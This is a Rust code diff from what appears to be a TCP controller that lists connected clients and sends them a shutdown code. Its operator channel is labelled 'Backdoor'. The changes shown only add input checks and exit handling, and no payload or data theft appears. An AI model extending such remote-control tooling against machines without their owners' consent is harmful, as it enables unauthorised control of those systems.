@@ -160,7 +160,8 @@ fn auth_manager(mut stream: TcpStream, sender: mpsc::Sender<String>, receiver: m
         match receiver.recv_timeout(Duration::from_millis(500)) {
             Ok(message) => {
                 log::info!("ger_client:  Received message: {}", message);
-                if message == "exit" {
+                if message.contains("999:") {
+                    log::info!("ger_client:  Thread exiting");
                     break;
                 }            
             }
@@ -182,10 +183,10 @@ fn tcp_reader(mut stream: TcpStream, sender: mpsc::Sender<String>) {
         // Read data from the TCP stream
         let bytes_read = stream.read(&mut buffer).unwrap();
         if bytes_read == 0 {
+            sender.send("999: shutdown".to_string()).unwrap();
             log::info!("tcp_reader: Client has closed the connection...");
             break; // Connection closed
         }
-
         // Convert the data to a String and send it through the channel
         let data = String::from_utf8_lossy(&buffer[..bytes_read]).to_string();
         sender.send(data).unwrap();
@@ -204,20 +205,7 @@ fn tcp_writer(mut stream: TcpStream, receiver: mpsc::Receiver<String>) {
         }
     }
 }
-fn _print_clients(){
-    let clients = clientdata::ClientData::list_clients();
 
-    // Itera sobre a lista de clientes
-    for client in clients {
-        println!("-----------------------------");
-        println!("Client ID: {}", client.id);
-        println!("Client IP: {}", client.ip);
-        println!("Client Status: {}", client.status);
-        println!("Client Port: {}", client.port);
-        println!("Client CID: {}", client.cid);
-        println!("-----------------------------");
-    }    
-}
 fn main() {
    // let args: Vec<String> = env::args().collect();
 
@@ -306,21 +294,29 @@ loop{
                     continue;
                 }
                 if received_data.contains("202:") {
-                    let client_id = &received_data[4..8];
-                    let mut u16client_id: u16 = 0;
-                    match client_id.parse::<u16>() {
-                        Ok(valor) => {
-                            u16client_id = valor;
-                            println!("Conversão bem-sucedida: {}", u16client_id);
-                        }
-                        Err(e) => println!("Falha na conversão: {}", e),
-                        
+                    if received_data.trim().len() < 8 {
+                        log::info!("Backdoor: You forgot client ID\n");
+                        continue;
                     }
-                    let shutdown: String = "999: shutdown".to_string();
-                    println!("Convertido: {}", u16client_id);
-                    clientdata::ClientData::send_client_msg_by_id(u16client_id,shutdown);
-                    thread::sleep(Duration::from_millis(5000));
-                    //process::exit(0);
+                    let client_id = &received_data[4..8];
+                    if client_id.is_empty() {
+                        log::info!("Backdoor: Invalid client ID\n");
+                    }else{
+                        let mut u16client_id: u16 = 0;
+                        match client_id.parse::<u16>() {
+                            Ok(valor) => {
+                                u16client_id = valor;
+                                println!("Conversão bem-sucedida: {}", u16client_id);
+                            }
+                            Err(e) => println!("Falha na conversão: {}", e),
+                            
+                        }
+                        let shutdown: String = "999: shutdown".to_string();
+                        println!("Convertido: {}", u16client_id);
+                        clientdata::ClientData::send_client_msg_by_id(u16client_id,shutdown);
+                        thread::sleep(Duration::from_millis(5000));
+                        //process::exit(0);
+                    }
                     continue;
                 }
                 if received_data.trim() == "201:" {
@@ -331,7 +327,11 @@ loop{
                     continue;
                 }// Handle the LISTAR command
                 if received_data.trim() == "L" || received_data.trim() == "l" {
-                    let clients = clientdata::ClientData::list_clients();   
+                    let clients = clientdata::ClientData::list_clients();
+                    if clients.is_empty() {
+                        stream.write("No clients connected\n".as_bytes()).unwrap();
+                        continue;
+                    }   
                     for client in clients {
                         let one_client = format!("Client ID: {} Client IP: {} Client Status: {} Client Port: {} Client CID: {}\n", client.id, client.ip, client.status, client.port, client.cid);
                         stream.write(one_client.as_bytes()).unwrap();
